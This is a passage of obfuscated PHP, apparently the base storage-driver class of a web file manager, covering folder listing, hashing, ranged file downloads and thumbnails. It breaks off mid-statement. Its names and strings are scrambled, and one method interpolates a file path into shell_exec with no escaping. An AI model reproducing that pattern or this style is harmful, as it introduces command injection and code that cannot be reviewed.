$ÄÇ¦•’³ =& $_SERVER[€ä¾™²]; static $éÑ˜Ö¬ğ = array(); if (isset($éÑ˜Ö¬ğ[$×û¨ƒ])) { return $éÑ˜Ö¬ğ[$×û¨ƒ]; } $®›Óƒô = $this->info($×û¨ƒ); if ($®›Óƒô && $®›Óƒô[$ÄÇ¦•’³[33]] == $ÄÇ¦•’³[78]) { $İ©¥š½Î = array($ÄÇ¦•’³[79] => 0, $ÄÇ¦•’³[80] => 0, $ÄÇ¦•’³[81] => 0); $this->infoChildren($×û¨ƒ, $İ©¥š½Î); $®›Óƒô[$ÄÇ¦•’³[79]] = $İ©¥š½Î[$ÄÇ¦•’³[79]]; $®›Óƒô[$ÄÇ¦•’³[82]] = array($ÄÇ¦•’³[83] => $İ©¥š½Î[$ÄÇ¦•’³[80]], $ÄÇ¦•’³[84] => $İ©¥š½Î[$ÄÇ¦•’³[81]]); $éÑ˜Ö¬ğ[$×û¨ƒ] = $®›Óƒô; } return $®›Óƒô; } public function listPath($ó˜¯êÈÃ, $€¾Øäˆƒ = false) { } public function has($é®×û®á, $‰àõ’ÜÕ = false, $§â½€†Ş = false) { } public function canRead($›ŞŸŸÜ) { } public function canWrite($¾èÔ›‘¶) { } public function getContent($ÛÕØ²“) { } public function setContent($Üú³Ğ‚, $¾éÖ«—¹ = '') { } protected function infoChildren($¦×òŸÆ, &$êãÄÒä) { $¬ÇˆÎæœ =& $_SERVER[€ä¾™²]; check_abort_echo(); $¶¸Â™êÕ = $this->listPath($¦×òŸÆ, !0); $¶¸Â™êÕ = array_merge($¶¸Â™êÕ[$¬ÇˆÎæœ[85]], $¶¸Â™êÕ[$¬ÇˆÎæœ[86]]); foreach ($¶¸Â™êÕ as $§È£ûĞ‡) { if ($§È£ûĞ‡[$¬ÇˆÎæœ[33]] == $¬ÇˆÎæœ[78]) { $êãÄÒä[$¬ÇˆÎæœ[81]]++; $Åô ƒ³¸ = $this->getPathInner($§È£ûĞ‡[$¬ÇˆÎæœ[87]]); $this->infoChildren($Åô ƒ³¸, $êãÄÒä); } else { $êãÄÒä[$¬ÇˆÎæœ[80]]++; $êãÄÒä[$¬ÇˆÎæœ[79]] += $§È£ûĞ‡[$¬ÇˆÎæœ[79]]; } } } public function fileSubstr($³ûüİ·Ô, $Ê’˜öê, $“ëåç„À) { } public function listAll($ÏÑİ»Ä) { } public function listAllMake($Ù¿Ó¿ç‹, &$©µ’ŞˆÜ) { $•‡û¢Å =& $_SERVER[€ä¾™²]; check_abort_echo(); $ äÏíæ = $this->listPath($Ù¿Ó¿ç‹, !0); if (!$ äÏíæ) { return; } $ÓÄò«¨Š = array_merge($ äÏíæ[$•‡û¢Å[85]], $ äÏíæ[$•‡û¢Å[86]]); foreach ($ÓÄò«¨Š as $È­ü¢ ü) { $•´Ÿ‚¹ = $È­ü¢ ü[$•‡û¢Å[33]] == $•‡û¢Å[78]; $É¯Ñ¶¥¤ = array($•‡û¢Å[87] => $È­ü¢ ü[$•‡û¢Å[87]], $•‡û¢Å[78] => $•´Ÿ‚¹); if (isset($È­ü¢ ü[$•‡û¢Å[79]])) { $É¯Ñ¶¥¤[$•‡û¢Å[79]] = $È­ü¢ ü[$•‡û¢Å[79]]; } if (isset($È­ü¢ ü[$•‡û¢Å[88]])) { $É¯Ñ¶¥¤[$•‡û¢Å[88]] = $È­ü¢ ü[$•‡û¢Å[88]]; } if (!$•´Ÿ‚¹) { $©µ’ŞˆÜ[] = $É¯Ñ¶¥¤; continue; } $©µ’ŞˆÜ[] = $É¯Ñ¶¥¤; $È¯¾¾Šì = $È­ü¢ ü[$•‡û¢Å[87]]; $ğ‰™©‹¹ = $this->pathDriver; if (substr($È­ü¢ ü[$•‡û¢Å[87]], 0, strlen($ğ‰™©‹¹)) == $ğ‰™©‹¹) { $È¯¾¾Šì = substr($È¯¾¾Šì, strlen($ğ‰™©‹¹)); } $this->listAllMake($È¯¾¾Šì, $©µ’ŞˆÜ); } } public function listAllSimple($³ïÒ¡, $æãµôß = false) { $­ÁÕĞÂÊ = $this->listAll($³ïÒ¡); return $this->listAllSimpleMake($­ÁÕĞÂÊ, $this->getPathOuter($³ïÒ¡), $æãµôß); } public function listAllSimpleMake($†íˆùº©, $÷Ş¢¹ç†, $™¥’ô») { $²ŠƒÌô =& $_SERVER[€ä¾™²]; $×´™ˆ¦Ö = array(); $÷Ş¢¹ç† = rtrim(get_path_father($÷Ş¢¹ç†), $²ŠƒÌô[8]) . $²ŠƒÌô[8]; foreach ($†íˆùº© as $›¬çê¥ã) { $ŞíôõÈÏ = array($²ŠƒÌô[87] => $›¬çê¥ã[$²ŠƒÌô[87]], $²ŠƒÌô[89] => $›¬çê¥ã[$²ŠƒÌô[87]], $²ŠƒÌô[78] => $›¬çê¥ã[$²ŠƒÌô[78]]); if (isset($›¬çê¥ã[$²ŠƒÌô[79]]) && !$›¬çê¥ã[$²ŠƒÌô[78]]) { $ŞíôõÈÏ[$²ŠƒÌô[79]] = $›¬çê¥ã[$²ŠƒÌô[79]]; } if (isset($›¬çê¥ã[$²ŠƒÌô[88]])) { $ŞíôõÈÏ[$²ŠƒÌô[88]] = $›¬çê¥ã[$²ŠƒÌô[88]]; } if (is_array($›¬çê¥ã[$²ŠƒÌô[90]])) { $ŞíôõÈÏ[$²ŠƒÌô[89]] = $›¬çê¥ã[$²ŠƒÌô[90]][$²ŠƒÌô[87]]; $ŞíôõÈÏ[$²ŠƒÌô[79]] = $›¬çê¥ã[$²ŠƒÌô[90]][$²ŠƒÌô[79]]; $ŞíôõÈÏ[$²ŠƒÌô[88]] = $›¬çê¥ã[$²ŠƒÌô[90]][$²ŠƒÌô[88]]; } else { if (substr($›¬çê¥ã[$²ŠƒÌô[87]], 0, strlen($÷Ş¢¹ç†)) == $÷Ş¢¹ç†) { $ŞíôõÈÏ[$²ŠƒÌô[87]] = substr($›¬çê¥ã[$²ŠƒÌô[87]], strlen($÷Ş¢¹ç†)); } } $’Ã¤•ï— = $›¬çê¥ã[$²ŠƒÌô[78]] ? $²ŠƒÌô[8] : $²ŠƒÌô[12]; $ŞíôõÈÏ[$²ŠƒÌô[89]] = rtrim($ŞíôõÈÏ[$²ŠƒÌô[89]], $²ŠƒÌô[8]) . $’Ã¤•ï—; $ŞíôõÈÏ[$²ŠƒÌô[87]] = $²ŠƒÌô[8] . trim($ŞíôõÈÏ[$²ŠƒÌô[87]], $²ŠƒÌô[8]) . $’Ã¤•ï—; if (!$™¥’ô») { $ßıÇÀì = explode($²ŠƒÌô[8], trim($ŞíôõÈÏ[$²ŠƒÌô[87]], $²ŠƒÌô[8])); $ŞíôõÈÏ[$²ŠƒÌô[87]] = $²ŠƒÌô[8] . implode($²ŠƒÌô[8], array_slice($ßıÇÀì, 1)) . $’Ã¤•ï—; } $×´™ˆ¦Ö[] = $ŞíôõÈÏ; } return array_sort_by($×´™ˆ¦Ö, $²ŠƒÌô[87]); } public function upload($Şè»¡¡¬, $àûÒ–´ß, $‚ü»‰ÂŠ = false, $Ğ‚Úïî = REPEAT_REPLACE) { } public function uploadFileByID($®£ºéø, $ı´íœÔ«, $­„¤ûĞ) { } public function uploadFileByPath($³Š„ˆ¾’, $”°ÇŒ , $í‚Á †à = array()) { } public function isUploadServer() { $æ¯»ÂŸÊ =& $_SERVER[€ä¾™²]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $æ¯»ÂŸÊ[91]) { return !0; } return $GLOBALS[$æ¯»ÂŸÊ[6]][$æ¯»ÂŸÊ[92]][$æ¯»ÂŸÊ[93]]; } public function isFileOutServer() { $ôâ‚“†¼ =& $_SERVER[€ä¾™²]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ôâ‚“†¼[91]) { return !0; } return $GLOBALS[$ôâ‚“†¼[6]][$ôâ‚“†¼[92]][$ôâ‚“†¼[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($²˜½¸ì‚) { $ë”ÏÈ™Å =& $_SERVER[€ä¾™²]; if (!$this->isCdnHost()) { return $²˜½¸ì‚; } return str_replace(trim(get_url_root($²˜½¸ì‚), $ë”ÏÈ™Å[8]), trim($this->cdnHost, $ë”ÏÈ™Å[8]), $²˜½¸ì‚); } public function uploadLink($œÒ„àûĞ, $º¶¸¶ì = 0) { $±Ô¸¶šã =& $_SERVER[€ä¾™²]; if ($this->isUploadServer()) { return; } $›í˜Åá„ = $this->getType(); if (!in_array($›í˜Åá„, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $˜§‚¿©ó = 1024 * 1024 * 10; $öÔ‘İÉû = (!$º¶¸¶ì ? 1 : ceil($º¶¸¶ì / pow(1024, 3))) * 3600 * 4; if ($º¶¸¶ì <= $˜§‚¿©ó) { $îÇ›àåº = $this->uploadFormData($œÒ„àûĞ, $öÔ‘İÉû); } else { $îÇ›àåº = $this->uploadMultiData($œÒ„àûĞ, $öÔ‘İÉû); } if ($îÇ›àåº) { $îÇ›àåº[$±Ô¸¶šã[95]] = $œÒ„àûĞ; $îÇ›àåº[$±Ô¸¶šã[96]] = $›í˜Åá„; } return $îÇ›àåº; } public function uploadFormData($ëşÓô ¦, $·„Ö = 3600) { } public function uploadMultiData($¹µö‡³÷, $Şá£§ä§ = 3600) { } public function multiUploadFormData($É“Àİğú, $¦óÉèôÇ = 3600) { return $this->uploadMultiData($É“Àİğú, $¦óÉèôÇ); } public function download($š¬ÁŒÄÁ, $ˆ³·¦›) { } public function ext($î‘—¥ÃØ) { $”ãš¯„ =& $_SERVER[€ä¾™²]; if (strpos($î‘—¥ÃØ, $”ãš¯„[8]) === -1) { $ˆÃ£ğÍœ = $î‘—¥ÃØ; } else { $ˆÃ£ğÍœ = $this->pathThis($î‘—¥ÃØ); } $­ªªÀôı = $”ãš¯„[12]; if (strstr($ˆÃ£ğÍœ, $”ãš¯„[10])) { $­ªªÀôı = substr($ˆÃ£ğÍœ, strrpos($ˆÃ£ğÍœ, $”ãš¯„[10]) + 1); $­ªªÀôı = strtolower($­ªªÀôı); } if (strlen($­ªªÀôı) > 3 && preg_match($”ãš¯„[97], $­ªªÀôı, $Ğ¦îšÚç)) { $­ªªÀôı = $”ãš¯„[12]; } return $­ªªÀôı; } public function pathThis($ë±Ì…Ô—) { $æ¾Ê†” =& $_SERVER[€ä¾™²]; $ë±Ì…Ô— = str_replace($æ¾Ê†”[98], $æ¾Ê†”[8], rtrim($ë±Ì…Ô—, $æ¾Ê†”[8])); $©¦®€ëœ = strrpos($ë±Ì…Ô—, $æ¾Ê†”[8]); if ($©¦®€ëœ === !1) { return $ë±Ì…Ô—; } return substr($ë±Ì…Ô—, $©¦®€ëœ + 1); } public function pathFather($áäë”Ä›) { $¬‹‚§¶ğ =& $_SERVER[€ä¾™²]; $áäë”Ä› = str_replace($¬‹‚§¶ğ[98], $¬‹‚§¶ğ[8], rtrim($áäë”Ä›, $¬‹‚§¶ğ[8])); $¦ÒáÔç¥ = strrpos($áäë”Ä›, $¬‹‚§¶ğ[8]); if ($¦ÒáÔç¥ === !1) { return $¬‹‚§¶ğ[12]; } return substr($áäë”Ä›, 0, $¦ÒáÔç¥ + 1); } public function hashSimple($ÄÍÃš¾¿) { $•˜¡ÉøÚ =& $_SERVER[€ä¾™²]; if (!$ÄÍÃš¾¿) { return md5($•˜¡ÉøÚ[12]); } $Î·Ôšà = $this->size($ÄÍÃš¾¿); $ãŠÅ÷Ê = 200; $ÓÄî¦– = 50; if ($Î·Ôšà <= $ãŠÅ÷Ê * $ÓÄî¦–) { return $this->hashMd5($ÄÍÃš¾¿) . $Î·Ôšà; } $ïÃŞÁÕ… = intval($Î·Ôšà / $ÓÄî¦–); $Åèä¥¦ = $•˜¡ÉøÚ[12]; for ($ß¸¾ßÉ = 0; $ß¸¾ßÉ < $ÓÄî¦–; $ß¸¾ßÉ++) { $Åèä¥¦ .= $this->fileSubstr($ÄÍÃš¾¿, $ïÃŞÁÕ… * $ß¸¾ßÉ, $ãŠÅ÷Ê); } $Åèä¥¦ .= $this->fileSubstr($ÄÍÃš¾¿, $Î·Ôšà - $ãŠÅ÷Ê, $ãŠÅ÷Ê); return md5($Åèä¥¦) . $Î·Ôšà; } public static $md5Cache = array(); public function hashMd5($àş”èà³) { if (!$àş”èà³) { return md5($_SERVER[€ä¾™²][12]); } $àş”èà³ = $this->iconvSystem($àş”èà³); if (isset(self::$md5Cache[$àş”èà³])) { return self::$md5Cache[$àş”èà³]; } self::$md5Cache[$àş”èà³] = $this->hashMd5Shell($àş”èà³); if (!self::$md5Cache[$àş”èà³]) { self::$md5Cache[$àş”èà³] = @md5_file($àş”èà³); } return self::$md5Cache[$àş”èà³]; } private function hashMd5Shell($»Û÷™™é) { $·Çù…„¢ =& $_SERVER[€ä¾™²]; if (!$»Û÷™™é) { return md5($·Çù…„¢[12]); } if (!function_exists($·Çù…„¢[99])) { return !1; } $Ñ«ÉĞ˜˜ = array($·Çù…„¢[100], $·Çù…„¢[101]); $—è×ÜÚŒ = Cache::get($·Çù…„¢[102]); if (!$—è×ÜÚŒ) { $è²ò¡‘ = BASIC_PATH . $·Çù…„¢[103]; $ûÂ©ÕÚ = md5_file($è²ò¡‘); $—è×ÜÚŒ = $·Çù…„¢[104]; foreach ($Ñ«ÉĞ˜˜ as $ë«À†) { $‡—’À“» = shell_exec($ë«À† . "\x20\x22{$è²ò¡‘}\42"); if ($‡—’À“» && substr(trim($‡—’À“»), 0, 32) == $ûÂ©ÕÚ) { $—è×ÜÚŒ = $ë«À†; break; } } Cache::set($·Çù…„¢[102], $—è×ÜÚŒ, 3600); } if ($—è×ÜÚŒ == $·Çù…„¢[104]) { return !1; } $‡—’À“» = shell_exec($—è×ÜÚŒ . "\40\42{$»Û÷™™é}\42"); $‡—’À“» = str_replace($·Çù…„¢[105], $·Çù…„¢[12], $‡—’À“»); return substr($‡—’À“», 0, 32); } public function link($ ¡–â‚Ä) { return $ ¡–â‚Ä; } public function fileOut($«ÎÌ›–Ç, $ÙÇŸüÁ = false, $úæ÷ãê™ = false, $¨¾Š¯ªç = '') { $Æí¾Ÿ‹à =& $_SERVER[€ä¾™²]; $this->cacheMethod(null, null); if (!$«ÎÌ›–Ç || !$this->exist($«ÎÌ›–Ç)) { show_json(LNG($Æí¾Ÿ‹à[106]), !1, $úæ÷ãê™); } $²ûŞ¤àÓ = $this->getType() == $Æí¾Ÿ‹à[107]; $£‰¬ĞøÆ = $GLOBALS[$Æí¾Ÿ‹à[6]][$Æí¾Ÿ‹à[92]][$Æí¾Ÿ‹à[108]][$Æí¾Ÿ‹à[109]]; $’µ…Õ¦¡ = (double) $GLOBALS[$Æí¾Ÿ‹à[6]][$Æí¾Ÿ‹à[92]][$Æí¾Ÿ‹à[108]][$Æí¾Ÿ‹à[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ã‚ô†æÎ = $this->infoFull($«ÎÌ›–Ç); $ÆïÄ¼øÁ = $ã‚ô†æÎ[$Æí¾Ÿ‹à[79]]; $Â³‰«Ùş = gmdate($Æí¾Ÿ‹à[111], $ã‚ô†æÎ[$Æí¾Ÿ‹à[88]]); $ê¯Î— = $úæ÷ãê™ ? $úæ÷ãê™ : $this->iconvApp($ã‚ô†æÎ[$Æí¾Ÿ‹à[32]]); $×ƒÑ²çÛ = 0; $ø“Ğû¶á = $ÆïÄ¼øÁ - 1; $ï½¨’’î = $this->ext($ê¯Î—); if (in_array($ï½¨’’î, array($Æí¾Ÿ‹à[112], $Æí¾Ÿ‹à[113], $Æí¾Ÿ‹à[114], $Æí¾Ÿ‹à[115]))) { $ï½¨’’î = $Æí¾Ÿ‹à[116]; } if (in_array($ï½¨’’î, array($Æí¾Ÿ‹à[117]))) { $ï½¨’’î = $Æí¾Ÿ‹à[118]; } if (!$¨¾Š¯ªç) { $¨¾Š¯ªç = md5($Â³‰«Ùş . $ÆïÄ¼øÁ); } $¨¾Š¯ªç = $Æí¾Ÿ‹à[119] . $¨¾Š¯ªç . $Æí¾Ÿ‹à[119]; $•áÄïİ = get_file_mime($ï½¨’’î); $á«§¼ = !0; $á«§¼ = isset($_GET[$Æí¾Ÿ‹à[120]]) ? !1 : !0; if ($ÙÇŸüÁ === !1 && !mime_support($•áÄïİ)) { $•áÄïİ = $Æí¾Ÿ‹à[121]; } header($Æí¾Ÿ‹à[122]); header($Æí¾Ÿ‹à[123] . $•áÄïİ); $¿æĞéöµ = rawurlencode($ê¯Î—); $¿æĞéöµ = $Æí¾Ÿ‹à[119] . $¿æĞéöµ . $Æí¾Ÿ‹à[124] . $¿æĞéöµ; if ($ÙÇŸüÁ) { header($Æí¾Ÿ‹à[125]); header($Æí¾Ÿ‹à[126] . $¿æĞéöµ); } else { if ($á«§¼) { header($Æí¾Ÿ‹à[127] . $¿æĞéöµ); } } $Ô–×ªè­ = 3600 * 24 * 30; header($Æí¾Ÿ‹à[128]); header($Æí¾Ÿ‹à[129]); header($Æí¾Ÿ‹à[130] . $Ô–×ªè­); header($Æí¾Ÿ‹à[131] . gmdate($Æí¾Ÿ‹à[111], time() + $Ô–×ªè­) . $Æí¾Ÿ‹à[132]); if (isset($_SERVER[$Æí¾Ÿ‹à[133]]) && strtotime($_SERVER[$Æí¾Ÿ‹à[133]]) == $ã‚ô†æÎ[$Æí¾Ÿ‹à[88]]) { header($Æí¾Ÿ‹à[134], !0, 304); die; } if (isset($_SERVER[$Æí¾Ÿ‹à[135]]) && $_SERVER[$Æí¾Ÿ‹à[135]] == $¨¾Š¯ªç) { header($Æí¾Ÿ‹à[136] . $¨¾Š¯ªç, !0, 304); die; } header($Æí¾Ÿ‹à[136] . $¨¾Š¯ªç); header($Æí¾Ÿ‹à[137] . $Â³‰«Ùş . $Æí¾Ÿ‹à[132]); header($Æí¾Ÿ‹à[138] . rawurlencode($ê¯Î—)); header($Æí¾Ÿ‹à[139]); header($Æí¾Ÿ‹à[140] . $ÆïÄ¼øÁ); header($Æí¾Ÿ‹à[141]); Hook::trigger($Æí¾Ÿ‹à[142], $«ÎÌ›–Ç, $ÆïÄ¼øÁ, $ê¯Î—, $ï½¨’’î); if (!$ÙÇŸüÁ && $ï½¨’’î == $Æí¾Ÿ‹à[143]) { if ($ÆïÄ¼øÁ > 1024 * 1024 * 10) { die; } $‡ş°Äı = $this->getContent($«ÎÌ›–Ç); $‡ş°Äı = Html::clearSVG($‡ş°Äı); header($Æí¾Ÿ‹à[144] . strlen($‡ş°Äı)); echo $‡ş°Äı; die; } $…ÑŞ¥³§ = strtolower($_SERVER[$Æí¾Ÿ‹à[145]]); if ($²ûŞ¤àÓ && $…ÑŞ¥³§ && $£‰¬ĞøÆ) { if (strstr($…ÑŞ¥³§, $Æí¾Ÿ‹à[146])) { header($Æí¾Ÿ‹à[147] . $«ÎÌ›–Ç); } else { if (strstr($…ÑŞ¥³§, $Æí¾Ÿ‹à[148])) { header($Æí¾Ÿ‹à[149] . $«ÎÌ›–Ç); } else { if (strstr($…ÑŞ¥³§, $Æí¾Ÿ‹à[150])) { header($Æí¾Ÿ‹à[151] . $«ÎÌ›–Ç); } } } if ($’µ…Õ¦¡) { header($Æí¾Ÿ‹à[152] . $’µ…Õ¦¡); } return; } if (isset($_SERVER[$Æí¾Ÿ‹à[153]])) { if (preg_match($Æí¾Ÿ‹à[154], $_SERVER[$Æí¾Ÿ‹à[153]], $èàØ˜Óá)) { $×ƒÑ²çÛ = intval($èàØ˜Óá[1]); $×ƒÑ²çÛ = $×ƒÑ²çÛ <= 0 ? 0 : ($×ƒÑ²çÛ >= $ø“Ğû¶á ? $ø“Ğû¶á : $×ƒÑ²çÛ); if (!empty($èàØ˜Óá[2])) { $éù¥¾†‡ = intval($èàØ˜Óá[2]); $ø“Ğû¶á = $éù¥¾†‡ < $×ƒÑ²çÛ ? $×ƒÑ²çÛ : ($éù¥¾†‡ >= $ø“Ğû¶á ? $ø“Ğû¶á : $éù¥¾†‡); } } header($Æí¾Ÿ‹à[155]); header("\x43\157\156\x74\145\x6e\x74\x2d\x52\x61\156\x67\x65\x3a\40\142\171\164\145\163\40{$×ƒÑ²çÛ}\55{$ø“Ğû¶á}\57" . $ÆïÄ¼øÁ); } else { header($Æí¾Ÿ‹à[156]); } header($Æí¾Ÿ‹à[157]); header($Æí¾Ÿ‹à[158]); $ˆƒÊ¡Œı = !0; if ($_SERVER[$Æí¾Ÿ‹à[159]] == $Æí¾Ÿ‹à[160] && $ÆïÄ¼øÁ > 1204 * 1024 * 1024 * 2) { $ˆƒÊ¡Œı = !1; } if ($ˆƒÊ¡Œı) { header($Æí¾Ÿ‹à[161] . ($ø“Ğû¶á - $×ƒÑ²çÛ + 1)); } if ($_SERVER[$Æí¾Ÿ‹à[162]] == $Æí¾Ÿ‹à[163]) { return; } $ùåÑÂëÓ = array($Æí¾Ÿ‹à[164] => !1, $Æí¾Ÿ‹à[165] => $×ƒÑ²çÛ, $Æí¾Ÿ‹à[166] => $ø“Ğû¶á, $Æí¾Ÿ‹à[167] => $ï½¨’’î, $Æí¾Ÿ‹à[168] => $ã‚ô†æÎ, $Æí¾Ÿ‹à[169] => $Æí¾Ÿ‹à[12], $Æí¾Ÿ‹à[170] => 0); $ùåÑÂëÓ = Hook::filter($Æí¾Ÿ‹à[171], $ùåÑÂëÓ); $Ôüøâ«é = 1024 * 300; $çåùì½Á = 0; if ($’µ…Õ¦¡) { $çåùì½Á = intval(1000 * 1000 * ($Ôüøâ«é / $’µ…Õ¦¡)); } while ($×ƒÑ²çÛ <= $ø“Ğû¶á) { $Ÿè”÷†÷ = timeFloat(); check_abort(); $Ö“Ô“ğš = $ø“Ğû¶á - $×ƒÑ²çÛ + 1; if ($Ö“Ô“ğš <= $Ôüøâ«é) { $Ôüøâ«é = $Ö“Ô“ğš; } $‡ş°Äı = $this->fileSubstr($«ÎÌ›–Ç, $×ƒÑ²çÛ, $Ôüøâ«é); if ($ùåÑÂëÓ[$Æí¾Ÿ‹à[164]]) { $ùåÑÂëÓ[$Æí¾Ÿ‹à[169]] = $‡ş°Äı; $ùåÑÂëÓ[$Æí¾Ÿ‹à[170]] = $×ƒÑ²çÛ; $ùåÑÂëÓ = Hook::filter($Æí¾Ÿ‹à[172], $ùåÑÂëÓ); $‡ş°Äı = $ùåÑÂëÓ[$Æí¾Ÿ‹à[169]]; } echo $‡ş°Äı; $×ƒÑ²çÛ += $Ôüøâ«é; if ($Ôüøâ«é == $Ö“Ô“ğš) { $×ƒÑ²çÛ = $ø“Ğû¶á + 1; } if ($çåùì½Á) { $Íí÷µÉ = intval(1000 * 1000 * (timeFloat() - $Ÿè”÷†÷)); $áÁğû¼† = $çåùì½Á - $Íí÷µÉ; if ($áÁğû¼† > 5) { usleep($áÁğû¼†); } } } } public function fileOutServer($Øóâå–Ã, $‘‚ˆ·‡Ê = false, $ˆ­ì­¢ú = false, $ÔÁˆÀ¥Ê = '') { $this->fileOut($Øóâå–Ã, $‘‚ˆ·‡Ê, $ˆ­ì­¢ú, $ÔÁˆÀ¥Ê); } public function fileOutLink($Í™Ø×ÓÒ) { header($_SERVER[€ä¾™²][173] . $Í™Ø×ÓÒ); die; } public function cacheMethod($â³’Ğ«ç, $Ú¤èèşº, $‚Ğæûª¥ = null) { $ˆ¥‰å£ñ =& $_SERVER[€ä¾™²]; static $÷Ê·ßğ¨ = array(); $°ÀÆ°Ş¶ = $Ú¤èèşº ? ltrim($this->getPathOuter($Ú¤èèşº), $ˆ¥‰å£ñ[8]) : $ˆ¥‰å£ñ[12]; $Úâ©èÏ¥ = $ˆ¥‰å£ñ[174] . $â³’Ğ«ç . $ˆ¥‰å£ñ[175] . rtrim($°ÀÆ°Ş¶, $ˆ¥‰å£ñ[8]); if (is_null($â³’Ğ«ç)) { $÷Ê·ßğ¨ = array(); return; } if (is_null($Ú¤èèşº)) { foreach ($÷Ê·ßğ¨ as $Úâ©èÏ¥ => $í—ôï‚) { if (!strstr($Úâ©èÏ¥, $ˆ¥‰å£ñ[174] . $â³’Ğ«ç . $ˆ¥‰å£ñ[176])) { continue; } unset($÷Ê·ßğ¨[$Úâ©èÏ¥]); } return; } if ($‚Ğæûª¥ === $ˆ¥‰å£ñ[177]) { unset($÷Ê·ßğ¨[$Úâ©èÏ¥]); return; } if (!is_null($‚Ğæûª¥)) { $÷Ê·ßğ¨[$Úâ©èÏ¥] = $‚Ğæûª¥; return; } $¥ÃÃ…À = isset($÷Ê·ßğ¨[$Úâ©èÏ¥]) ? $÷Ê·ßğ¨[$Úâ©èÏ¥] : null; if (!is_null($¥ÃÃ…À)) { return $¥ÃÃ…À; } $¥ÃÃ…À = $this->{$â³’Ğ«ç}($Ú¤èèşº); $÷Ê·ßğ¨[$Úâ©èÏ¥] = $¥ÃÃ…À; return $¥ÃÃ…À; } public function cacheMethodInfoSet($‘öÚ½¶, $œÒÔşÁ, $ßéèä¥â = false) { $Úš°ÎË =& $_SERVER[€ä¾™²]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Úš°ÎË[178], $‘öÚ½¶, $œÒÔşÁ); $this->cacheMethod($Úš°ÎË[179], $‘öÚ½¶, $œÒÔşÁ ? !1 : !0); if (is_array($ßéèä¥â)) { $this->cacheMethod($Úš°ÎË[180], $‘öÚ½¶, $ßéèä¥â); } } public function fileOutImage($ù®î¤ß’, $Ûş±ŞÊ… = 250) { $¨ÇßÒ‡• =& $_SERVER[€ä¾™²]; set_timeout(); if (substr($ù®î¤ß’, 0, 4) == $¨ÇßÒ‡•[150]) { $this->fileOutLink($ù®î¤ß’); } $²ÓœÍ® = $this->info($ù®î¤ß’); $‚•¬ª’ì = !1; $¹€‚ÜÈê = isset($GLOBALS[$¨ÇßÒ‡•[181]]) ? $GLOBALS[$¨ÇßÒ‡•[181]] : array(); if ($¹€‚ÜÈê && $¹€‚ÜÈê[$¨ÇßÒ‡•[182]] == $²ÓœÍ®[$¨ÇßÒ‡•[87]]) { $²ÓœÍ® = $¹€‚ÜÈê; $…ÇøßŸØ = $²ÓœÍ®[$¨ÇßÒ‡•[183]]; if ($…ÇøßŸØ && isset($…ÇøßŸØ[$¨ÇßÒ‡•[184]])) { if ($…ÇøßŸØ[$¨ÇßÒ‡•[184]] <= $Ûş±ŞÊ… && $…ÇøßŸØ[$¨ÇßÒ‡•[185]] <= $Ûş±ŞÊ…) { $‚•¬ª’ì = !0; } } } if ($²ÓœÍ®[$¨ÇßÒ‡•[79]] <= 1024 * 50 || $‚•¬ª’ì || !function_exists($¨ÇßÒ‡•[186]) || $²ÓœÍ®[$¨ÇßÒ‡•[167]] == $¨ÇßÒ‡•[187]) { return $this->fileOut($ù®î¤ß’, !1, $²ÓœÍ®[$¨ÇßÒ‡•[32]]); } $œìœ´ßÁ = kodIO::hashPath($²ÓœÍ®); $ØÑ³Ÿêˆ = "\x63\x6f\x76\x65\x72\137{$œìœ´ßÁ}\137{$Ûş±ŞÊ…}\x2e\160\156\147"; $€Æª³ß½ = IO_PATH_SYSTEM_TEMP . $¨ÇßÒ‡•[188]; $Çõç†à– = IO::infoFullSimple($€Æª³ß½); $ìØòÖñİ = $Çõç†à– && is_array($Çõç†à–) ? $Çõç†à–[$¨ÇßÒ‡•[87]] : $¨ÇßÒ‡•[12]; if (!$ìØòÖñİ) { $ìØòÖñİ = IO::mkdir($€Æª³ß½); } if ($²ÓœÍ®[$¨ÇßÒ‡•[189]] == $¨ÇßÒ‡•[190] && isset($²ÓœÍ®[$¨ÇßÒ‡•[191]]) && $²ÓœÍ®[$¨ÇßÒ‡•[191]] == kodIO::sourceID($ìØòÖñİ)) { $¨ÒéÃª’ = $²ÓœÍ®[$¨ÇßÒ‡•[192]]; if ($Ûş±ŞÊ… <= 500) { $á®Ï˜Ï = preg_replace($¨ÇßÒ‡•[193], $¨ÇßÒ‡•[194], $²ÓœÍ®[$¨ÇßÒ‡•[32]]); $¨ÒéÃª’ = IO::fileNameExist($ìØòÖñİ, $á®Ï˜Ï); } return IO::fileOut(KodIO::make($¨ÒéÃª’), !1, $²ÓœÍ®[$¨ÇßÒ‡•[32]]); } $µ½Âí¿ = IO::fileNameExist($ìØòÖñİ, $ØÑ³Ÿêˆ); if ($µ½Âí¿) { return IO::fileOut(KodIO::make($µ½Âí¿), !1, $²ÓœÍ®[$¨ÇßÒ‡•[32]]); } if ($Ûş±ŞÊ… > 1000) { $this->makeImageCover($ìØòÖñİ, $ù®î¤ß’, $ØÑ³Ÿêˆ, $Ûş±ŞÊ…); $this->makeImageCover($ìØòÖñİ, $ù®î¤ß’, "\143\x6f\x76\x65\162\x5f{$œìœ´ßÁ}\137\62\x35\60\56\x70\156\x67", 250); $µ½Âí¿ = IO::fileNameExist($ìØòÖñİ, $ØÑ³Ÿêˆ); if ($µ½Âí¿) { return IO::fileOut(KodIO::make($µ½Âí¿), !1, $²ÓœÍ®[$¨ÇßÒ‡•[32]]); } die; } if (!kodIO::allowCover($²ÓœÍ®)) { return $this->fileOut($ù®î¤ß’, !1, $²ÓœÍ®[$¨ÇßÒ‡•[32]]); } $‚Æ™“ = Cache::get($ØÑ³Ÿêˆ); if ($‚Æ™“ == $¨ÇßÒ‡•[195] || $‚Æ™“ == $¨ÇßÒ‡•[196]) { echo $‚Æ™“; die; } Cache::set($ØÑ³Ÿêˆ, $¨ÇßÒ‡•[196], 60); $ßÄõÚ—É = array($ìØòÖñİ, $²ÓœÍ®[$¨ÇßÒ‡•[87]], $ØÑ³Ÿêˆ, $Ûş±ŞÊ…); $öôÚ©õÊ = $¨ÇßÒ‡•[197] . $²ÓœÍ®[$¨ÇßÒ‡•[79]] . $¨ÇßÒ‡•[198] . $ØÑ³Ÿêˆ . $¨ÇßÒ‡•[199] . 